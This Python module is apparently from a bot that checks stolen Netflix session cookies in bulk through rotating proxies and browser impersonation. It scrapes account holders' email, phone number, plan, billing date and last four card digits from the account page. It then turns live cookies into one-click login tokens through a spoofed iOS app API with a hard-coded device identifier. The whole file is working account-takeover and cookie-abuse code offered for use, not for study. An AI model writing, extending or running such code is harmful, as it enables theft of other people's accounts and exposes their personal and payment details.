"""
Netflix cookie checker and NFToken generator.

This module follows the same extraction flow as net_fixed.py:
- robust account parsing from /account
- profile recovery from /browse
- resilient cookie parsing from mixed input formats
"""

import json
import logging
import re
import threading
from datetime import datetime
from html import unescape
from urllib.parse import unquote

from curl_cffi import requests as curl_requests

from proxies import get_proxy, mark_bad

logger = logging.getLogger("NetflixBot")

REQUEST_TIMEOUT = (10, 30)
thread_local = threading.local()


def _try_request(requestor, *, use_proxy_first=True):
    """
    Chạy requestor(proxy_url) — Ưu tiên direct (VPS) nếu use_proxy_first=False.
    Nếu use_proxy_first=True: thử 3 proxy sống → fallback IP VPS (None).
    Proxy lỗi mạng / HTTP 403/429/5xx → mark_bad và thử proxy kế.
    Trả (response, proxy_used). Có thể ném exception cuối cùng (VPS cũng lỗi).
    """
    if use_proxy_first:
        for _ in range(3):
            proxy = get_proxy()
            try:
                resp = requestor(proxy)
            except Exception:
                if proxy:
                    mark_bad(proxy)
                continue
            if resp is None:
                continue
            if proxy and resp.status_code in (403, 429, 500, 502, 503, 504):
                mark_bad(proxy)
                continue
            return resp, proxy
        return requestor(None), None
    else:
        return requestor(None), None


def _create_session():
    session = curl_requests.Session(impersonate="chrome120")
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Cache-Control": "no-cache",
        "Sec-Ch-Ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": '"Windows"',
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "Upgrade-Insecure-Requests": "1",
    })
    return session


def get_session():
    if not hasattr(thread_local, "session"):
        thread_local.session = _create_session()
    return thread_local.session


def decode_response(raw_html):
    html = unescape(raw_html or "")
    return bytes(html, "utf-8").decode("raw_unicode_escape", errors="ignore")


def _prepare_json_text(text):
    r"""Convert \xXX escapes to JSON-safe \u00XX."""
    return re.sub(r"\\x([0-9a-fA-F]{2})", r"\\u00\1", text)


def _extract_json_obj(text, key):
    """Best-effort extraction of a JSON object starting near key marker."""
    idx = text.find(key)
    if idx == -1:
        return None

    start = text.find("{", idx)
    if start == -1:
        return None

    depth = 0
    for i in range(start, min(len(text), start + 200000)):
        ch = text[i]
        if ch == "{":
            depth += 1
        elif ch == "}":
            depth -= 1
            if depth == 0:
                raw = text[start:i + 1]
                try:
                    return json.loads(raw)
                except Exception:
                    pass
                try:
                    return json.loads(_prepare_json_text(raw))
                except Exception:
                    return None
    return None


def _clean_val(val):
    if not isinstance(val, str):
        return val
    if "\\x" in val or "\\u" in val:
        try:
            val = re.sub(r"\\x([0-9a-fA-F]{2})", lambda m: chr(int(m.group(1), 16)), val)
            val = re.sub(r"\\u([0-9a-fA-F]{4})", lambda m: chr(int(m.group(1), 16)), val)
        except Exception:
            pass
    return val


def _find_authurl(decoded_html):
    for pat in (
        r'"authURL"\s*:\s*"([^"]+)"',
        r'authURL\\":\\"([^"\\]+)\\"',
        r'authURL\s*=\s*"([^"]+)"',
    ):
        m = re.search(pat, decoded_html)
        if m:
            return _clean_val(m.group(1))
    return "-"


def _deep_search(obj, keys, results=None, depth=0):
    if results is None:
        results = {}
    if depth > 15:
        return results

    if isinstance(obj, dict):
        for key, value in obj.items():
            if key in keys and value and key not in results:
                results[key] = value
            if isinstance(value, (dict, list)):
                _deep_search(value, keys, results, depth + 1)
    elif isinstance(obj, list):
        for item in obj:
            if isinstance(item, (dict, list)):
                _deep_search(item, keys, results, depth + 1)
    return results


def parse_account_info(decoded_html):
    """Simple parser like app.py (minimal checks, stable extraction)."""
    decoded_html_norm = decoded_html.replace('\\"', '"')
    result = {
        "status": "LIVE",
        "plan": "-",
        "price": "-",
        "billing": "-",
        "videoQuality": "-",
        "maxStreams": "-",
        "paymentType": "-",
        "last4": "-",
        "displayName": "-",
        "owner": "-",
        "email": "-",
        "country": "-",
        "membershipStatus": "-",
        "memberSince": "-",
        "phone": "-",
        "phoneNumber": "-",
        "phoneNumberVerified": False,
        "profiles": "-",
        "numProfiles": 0,
        "numKidsProfiles": 0,
        "extraMembers": False,
        "authURL": "-",
    }

    plan_match = re.search(
        r'"currentPlan":\{"fieldType":"Group","fieldGroup":"MemberPlan","fields":\{"localizedPlanName":\{"fieldType":"String","value":"(.*?)"\}',
        decoded_html,
    )
    if plan_match:
        result["plan"] = _clean_val(plan_match.group(1))

    billing_match = re.search(r'"nextBillingDate":\{"fieldType":"String","value":"(.*?)"\}', decoded_html)
    if not billing_match:
        billing_match = re.search(r'"nextBillingDate":\{"fieldType":"String","value":"(.*?)"\}', decoded_html_norm)
    if billing_match:
        result["billing"] = re.sub(r"\s+", " ", str(_clean_val(billing_match.group(1))).replace("\\", " ")).strip()
    if result["billing"] == "-":
        for source in (decoded_html, decoded_html_norm):
            for pat in (
                r'"nextBillingDate"\s*:\s*"([^"]+)"',
                r'"nextBillingDate"\s*:\s*\{[\s\S]{0,500}?"value"\s*:\s*"([^"]+)"',
            ):
                m = re.search(pat, source)
                if m:
                    result["billing"] = re.sub(r"\s+", " ", str(_clean_val(m.group(1))).replace("\\", " ")).strip()
                    break
            if result["billing"] != "-":
                break

    member_since_match = re.search(
        r'"memberSince"\s*:\s*"(\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}\.\d+Z)"',
        decoded_html,
    )
    if member_since_match:
        try:
            dt = datetime.strptime(member_since_match.group(1), "%Y-%m-%dT%H:%M:%S.%fZ")
            result["memberSince"] = f"{dt.day} {dt.strftime('%B %Y')}"
        except Exception:
            pass

    phone_number_match = re.search(
        r'"growthPhoneNumber"\s*:\s*\{[^}]*"isVerified"\s*:\s*(true|false|null),\s*"phoneNumberDigits"\s*:\s*(null|\{[^}]*"value"\s*:\s*"([^"]*)"\})',
        decoded_html,
    )
    if phone_number_match:
        is_verified_str = phone_number_match.group(1)
        phone_number_block = phone_number_match.group(2)
        phone_number_value = phone_number_match.group(3)
        if phone_number_block == "null" or phone_number_value is None:
            result["phoneNumber"] = "No Phone Number"
            result["phoneNumberVerified"] = False
        else:
            result["phoneNumber"] = _clean_val(phone_number_value)
            result["phoneNumberVerified"] = is_verified_str == "true"
    else:
        result["phoneNumber"] = "NOT FOUND"
        result["phoneNumberVerified"] = False

    quality_match = re.search(r'"videoQuality":\{"fieldType":"String","value":"(.*?)"\}', decoded_html)
    if quality_match:
        result["videoQuality"] = _clean_val(quality_match.group(1))

    stream_match = re.search(r'"maxStreams":\{"fieldType":"Numeric","value":(\d+)\}', decoded_html)
    if stream_match:
        result["maxStreams"] = stream_match.group(1)

    pay_type_match = re.search(r'"type":\{"fieldType":"String","value":"(.*?)"\}', decoded_html)
    if pay_type_match:
        result["paymentType"] = _clean_val(pay_type_match.group(1))

    last4_match = re.search(r'"displayText":\{"fieldType":"String","value":"(.*?)"\}', decoded_html)
    if last4_match:
        result["last4"] = _clean_val(last4_match.group(1))
    if result["last4"] == "-":
        m_last4 = re.search(r'"last4"\s*:\s*"?(\d{4})"?', decoded_html)
        if m_last4:
            result["last4"] = m_last4.group(1)

    acc_info = re.search(r'"accountInfo":\{"data":\{(.*?)\}\s*,\s*"type":"api"\}', decoded_html, re.DOTALL)
    if acc_info:
        block = acc_info.group(1)
        name = re.search(r'"displayName":"(.*?)"', block)
        if name:
            result["displayName"] = _clean_val(name.group(1))
        email = re.search(r'"emailAddress":"(.*?)"', block)
        if email:
            result["email"] = _clean_val(email.group(1))
        country = re.search(r'"country":"(.*?)"', block)
        if country:
            result["country"] = country.group(1)
        status = re.search(r'"membershipStatus":"(.*?)"', block)
        if status:
            result["membershipStatus"] = _clean_val(status.group(1))

    # userInfo fallback
    user_obj = _extract_json_obj(decoded_html, '"userInfo"')
    if isinstance(user_obj, dict):
        if result["displayName"] == "-":
            result["displayName"] = _clean_val(user_obj.get("name") or user_obj.get("displayName") or "-")
        if result["email"] == "-" and user_obj.get("emailAddress"):
            result["email"] = _clean_val(user_obj.get("emailAddress"))
        if result["country"] == "-":
            cc = user_obj.get("currentCountry") or user_obj.get("countryOfSignup")
            if cc:
                result["country"] = _clean_val(cc)
        if result["membershipStatus"] == "-" and user_obj.get("membershipStatus"):
            result["membershipStatus"] = _clean_val(user_obj.get("membershipStatus"))
        if result["memberSince"] == "-" and user_obj.get("memberSince"):
            result["memberSince"] = _clean_val(user_obj.get("memberSince"))
        if user_obj.get("authURL"):
            result["authURL"] = _clean_val(user_obj.get("authURL"))

    # generic fallbacks
    if result["email"] == "-":
        m = re.search(r'"emailAddress"\s*:\s*"([^"]+?(?:@|\\x40)[^"]+)"', decoded_html, re.IGNORECASE)
        if m:
            result["email"] = _clean_val(m.group(1))

    if result["country"] == "-":
        m = re.search(r'"currentCountry"\s*:\s*"([A-Z]{2})"', decoded_html)
        if not m:
            m = re.search(r'"countryOfSignup"\s*:\s*"([A-Z]{2})"', decoded_html)
        if m:
            result["country"] = m.group(1)

    if result["membershipStatus"] == "-":
        m = re.search(r'"membershipStatus"\s*:\s*"([^"]+)"', decoded_html)
        if m:
            result["membershipStatus"] = _clean_val(m.group(1))

    if result["memberSince"] == "-":
        m = re.search(r'"memberSince"\s*:\s*"([^"]+)"', decoded_html)
        if m:
            result["memberSince"] = _clean_val(m.group(1))

    if result["authURL"] == "-":
        result["authURL"] = _find_authurl(decoded_html)

    result["owner"] = result["displayName"]
    if result["phone"] == "-" and result["phoneNumber"] != "-":
        result["phone"] = result["phoneNumber"]

    # keep profile output simple and predictable
    if result["profiles"] == "-" and result["displayName"] not in ("-", ""):
        result["profiles"] = result["displayName"]
        result["numProfiles"] = 1

    # ═══ VALIDATION: Detect dead cookies ═══
    membership = result.get("membershipStatus", "").upper()
    
    # Các trạng thái chắc chắn DEAD (Hard DEAD - không cần retry)
    if membership in ("FORMER_MEMBER", "NEVER_MEMBER", "NON_MEMBER", "ANONYMOUS"):
        logger.info(f"Cookie Hard DEAD - membershipStatus: {membership}")
        result["status"] = "DEAD"
        result["is_hard_dead"] = True
        result["is_soft_dead"] = False
        result["dead_reason"] = f"Membership: {membership}"
        return result
    
    # Nếu membershipStatus là CURRENT_MEMBER → chắc chắn LIVE
    if membership == "CURRENT_MEMBER":
        result["is_hard_dead"] = False
        result["is_soft_dead"] = False
        return result
    
    # Nếu có bất kỳ thông tin account nào (plan, email, country, profile...) → LIVE
    has_any_info = any(
        result.get(f) not in ("-", "", None, "NOT FOUND", "No Phone Number")
        for f in ("plan", "email", "country", "displayName", "billing", "authURL")
    )
    if has_any_info:
        result["is_hard_dead"] = False
        result["is_soft_dead"] = False
        return result  # Có thông tin → LIVE
    
    # Nếu membershipStatus là "-" VÀ không có thông tin gì → Soft DEAD (cần strike count để xác nhận)
    logger.info(f"Cookie Soft DEAD - no valid account info (membership={membership})")
    result["status"] = "DEAD"
    result["is_hard_dead"] = False
    result["is_soft_dead"] = True
    result["dead_reason"] = "parse_failed"
    return result


def _parse_cookie_input(raw):
    raw_text = (raw or "").strip()

    # NETSCAPE format: .netflix.com\tFALSE\t/\tFALSE\texpiry\tNetflixId\tvalue
    # (file Hydra / trình duyệt export / import-netflix-cookies.ts).
    # Phải xử lý TRƯỚC nhánh unquote vì Netscape không chứa "NetflixId=".
    if "\t" in raw_text and "NetflixId" in raw_text:
        for line in raw_text.split("\n"):
            f = line.strip().split("\t")
            if len(f) >= 7 and f[5] == "NetflixId":
                nid = f[6].strip()
                sid = None
                for lf in raw_text.split("\n"):
                    lf_parts = lf.strip().split("\t")
                    if len(lf_parts) >= 7 and lf_parts[5] == "SecureNetflixId":
                        sid = lf_parts[6].strip()
                        break
                extras = {}
                for lf in raw_text.split("\n"):
                    lf_parts = lf.strip().split("\t")
                    if len(lf_parts) >= 7 and lf_parts[5] == "nfvdid":
                        extras["nfvdid"] = lf_parts[6].strip()
                        break
                return nid, sid, extras
        # Có "NetflixId" nhưng parse được index → thử tiếp nhánh dưới

    decoded = unquote(raw_text)
    netflix_id = None
    secure_id = None
    extras = {}

    netflix_match = re.search(r"NetflixId=([^;\s]+)", decoded)
    secure_match = re.search(r"SecureNetflixId=([^;\s]+)", decoded)
    nfvdid_match = re.search(r"nfvdid=([^;\s]+)", decoded)

    if netflix_match:
        netflix_id = netflix_match.group(1).strip()
    if secure_match:
        secure_id = secure_match.group(1).strip()
    if nfvdid_match:
        extras["nfvdid"] = nfvdid_match.group(1).strip()

    if netflix_id is None:
        parts = [p.strip() for p in decoded.split("|")]
        if parts and parts[0]:
            netflix_id = parts[0]
        if len(parts) > 1 and parts[1] and not secure_id:
            secure_id = parts[1]
        for part in parts[2:]:
            if "=" in part:
                key, value = part.split("=", 1)
                key = key.strip()
                value = value.strip()
                if key and value:
                    extras[key] = value

    if secure_id is None:
        secure_pipe = re.search(r"(?:^|\|)\s*SecureNetflixId=([^|;\s]+)", decoded)
        if secure_pipe:
            secure_id = secure_pipe.group(1).strip()

    if netflix_id:
        netflix_id = netflix_id.strip()
    if secure_id:
        secure_id = secure_id.strip()

    return netflix_id, secure_id, extras


def parse_cookie_line(raw_line):
    """Parse cookie input into (netflix_id, secure_id, extras_dict)."""
    netflix_id, secure_id, extras = _parse_cookie_input(raw_line)

    if not netflix_id:
        return None, None, {}

    if netflix_id in {"1", "2", "3", "4"}:
        return None, None, {}

    return netflix_id, secure_id, extras


def check_cookie(netflix_id, secure_id=None, extra_cookies=None, direct=False):
    """Check cookie status - matched with bot cũ (net_fixed.py) logic for accuracy.

    Chỉ check MỘT lần duy nhất (không double-confirm). direct=True → gọi thẳng
    IP VPS (không proxy), dùng để xác minh lại cookie bị nghi DEAD do proxy trả
    trang login/throttled."""
    if not netflix_id:
        return {"status": "ERROR", "error": "Missing NetflixId"}

    url = "https://www.netflix.com/account"
    cookies = {"NetflixId": netflix_id}
    if secure_id:
        cookies["SecureNetflixId"] = secure_id
    if extra_cookies:
        cookies.update(extra_cookies)

    # Tạo session MỚI cho mỗi lần check (giống net_fixed.py)
    session = _create_session()

    def _do_request(proxy=None):
        return session.get(
            url,
            cookies=cookies,
            allow_redirects=True,
            timeout=REQUEST_TIMEOUT,
            proxies={"https": proxy, "http": proxy} if proxy else None,
        )

    try:
        r = _do_request(None)

        # HTTP guard: IP bị throttle / lỗi server → ERROR, không đánh DEAD oan
        if r.status_code in (403, 429):
            logger.warning(f"check_cookie: HTTP {r.status_code} - Throttled (IP may be blocked)")
            return {"status": "ERROR", "error": f"HTTP {r.status_code} - Throttled"}
        if r.status_code >= 500:
            logger.warning(f"check_cookie: HTTP {r.status_code} - Netflix server error")
            return {"status": "ERROR", "error": f"Netflix Server Error {r.status_code}"}

        # Collect all cookies from response
        all_cookies = dict(cookies)
        try:
            for name, cookie in r.cookies.items():
                all_cookies[name] = getattr(cookie, "value", cookie)
        except Exception:
            pass

        # DEAD: final URL chứa "login" nhưng KHÔNG chứa "account"
        final_url = str(getattr(r, 'url', '') or '').lower()
        if "login" in final_url and "account" not in final_url:
            logger.info(f"Cookie redirect to login: final_url={final_url} (soft dead candidate)")
            return {
                "status": "DEAD",
                "is_hard_dead": False,
                "is_soft_dead": True,
                "dead_reason": "redirect_login",
            }

        # Parse the page
        decoded = decode_response(r.text or "")
        info = parse_account_info(decoded)

        # Nếu parse_account_info đã phát hiện DEAD thì return luôn
        if info.get("status") == "DEAD":
            return info

        # DEAD: account has no active membership
        membership = info.get("membershipStatus", "-")
        if membership in ("ANONYMOUS", "FORMER_MEMBER", "NON_MEMBER", "NEVER_MEMBER"):
            return {
                "status": "DEAD",
                "is_hard_dead": True,
                "is_soft_dead": False,
                "dead_reason": f"Membership: {membership}",
            }

        # Extract nfvdid
        nfvdid_match = re.search(r'"nfvdid"\s*:\s*"([^"]+)"', decoded)
        if nfvdid_match and "nfvdid" not in all_cookies:
            all_cookies["nfvdid"] = nfvdid_match.group(1)
        if "nfvdid" not in all_cookies:
            nfvdid_match2 = re.search(r"nfvdid=([^;\s\"]+)", decoded)
            if nfvdid_match2:
                all_cookies["nfvdid"] = nfvdid_match2.group(1)

        info["_cookies"] = all_cookies
        return info

    except Exception as e:
        logger.warning(f"check_cookie error: {e}")
        return {"status": "ERROR", "error": "INTERNAL_ERROR"}


IOS_ESN = (
    "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200"
)


def generate_nftoken(cookie_dict):
    """
    Generate NFToken via iOS Argo API (ios.prod.ftl.netflix.com/iosui/user).
    Chỉ cần NetflixId — luồng đã test thật (2026-07-31): token dạng
    "Bgj8vOvcAxLC..." mở được qua /login?nftoken= → session LIVE.
    Returns (token_string, error_string).
    """
    netflix_id = cookie_dict.get("NetflixId")
    if not netflix_id:
        return None, "Missing: NetflixId"

    params = {
        "appVersion": "15.48.1",
        "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false"}',
        "device_type": "NFAPPL-02-",
        "esn": IOS_ESN.replace("=", "%3D"),
        "idiom": "phone",
        "iosVersion": "15.8.5",
        "isTablet": "false",
        "languages": "en-US",
        "locale": "en-US",
        "maxDeviceWidth": "375",
        "model": "saget",
        "modelType": "IPHONE8-1",
        "odpAware": "true",
        "path": '["account","token","default"]',
        "pathFormat": "graph",
        "pixelDensity": "2.0",
        "progressive": "false",
        "responseFormat": "json",
    }

    headers = {
        "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
        "x-netflix.request.attempt": "1",
        "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
        "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
        "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
        "x-netflix.context.app-version": "15.48.1",
        "x-netflix.argo.translated": "true",
        "x-netflix.context.form-factor": "phone",
        "x-netflix.context.sdk-version": "2012.4",
        "x-netflix.client.appversion": "15.48.1",
        "x-netflix.context.max-device-width": "375",
        "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
        "x-netflix.client.type": "argo",
        "x-netflix.client.ftl.esn": IOS_ESN,
        "x-netflix.context.locales": "en-US",
        "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
        "x-netflix.client.iosversion": "15.8.5",
        "accept-language": "en-US;q=1",
        "x-netflix.context.os-version": "15.8.5",
        "x-netflix.request.client.context": '{"appState":"foreground"}',
        "x-netflix.context.ui-flavor": "argo",
        "x-netflix.argo.nfnsm": "9",
        "x-netflix.context.pixel-density": "2.0",
        "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
        "x-netflix.request.client.timezoneid": "Asia/Dhaka",
        "Cookie": f"NetflixId={netflix_id}",
    }

    api_url = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
    session = get_session()

    last_err = "Invalid response"
    try:
        def _do_get(proxy=None):
            return session.get(
                api_url,
                params=params,
                headers=headers,
                timeout=REQUEST_TIMEOUT,
                proxies={"https": proxy, "http": proxy} if proxy else None,
            )

        response = None
        try:
            response = _do_get(None)
            if response is not None and response.status_code == 200:
                pass
            else:
                if response is not None:
                    last_err = f"HTTP {response.status_code}"
                response = None
        except Exception:
            response = None
        if response is None:
            for _attempt in range(3):
                response, _ = _try_request(_do_get)
                if response is None:
                    continue
                if response.status_code != 200:
                    last_err = f"HTTP {response.status_code}"
                    response = None
                    continue
                break
        if response is None:
            return None, last_err

        data = response.json()
        value = data.get("value") or {}
        account = value.get("account") or {}
        token_obj = (account.get("token") or {}).get("default") or {}
        token = token_obj.get("token") or ""
        if token and token != "{}":
            return token, None

        if data.get("errors"):
            err_msg = data["errors"][0].get("message", "Unknown")
            last_err = f"API Error: {err_msg}"
        return None, last_err
    except Exception as e:
        logger.warning(f"generate_nftoken error: {e}")
        return None, "INTERNAL_ERROR"


def validate_nftoken(token, timeout=REQUEST_TIMEOUT):
    """
    Xác thực nftoken bằng luồng web: GET /login?nftoken=<token> → follow redirect
    → check session NetflixId mới server vừa tạo.
    Lưu ý: tạm tắt trong luồng chính để tối ưu tốc độ ra link.
    Đã test thật (2026-07-31) với token iOS Argo API:
    - Token hợp lệ: 302 /hk-en/login → 200, server set NetflixId MỚI = session
      account thật (check_cookie → LIVE) → True
    - Token rác/hết hạn: không set NetflixId mới (hoặc ANONYMOUS) → False
    - HTTP error/timeout → None (unknown — vẫn gửi, không chặn)
    """
    if not token:
        return None
    from urllib.parse import quote

    url = f"https://www.netflix.com/login?nftoken={quote(token, safe='')}"
    session = _create_session()

    def _do_get(proxy=None):
        return session.get(
            url,
            allow_redirects=True,
            timeout=timeout,
            proxies={"https": proxy, "http": proxy} if proxy else None,
        )

    try:
        r, _ = _try_request(_do_get)
        if r.status_code in (403, 429) or r.status_code >= 500:
            return None

        new_nid = session.cookies.get("NetflixId")
        if new_nid:
            return True
        return False
    except Exception as e:
        logger.warning(f"validate_nftoken error: {e}")
        return None
    finally:
        try:
            session.close()
        except Exception:
            pass
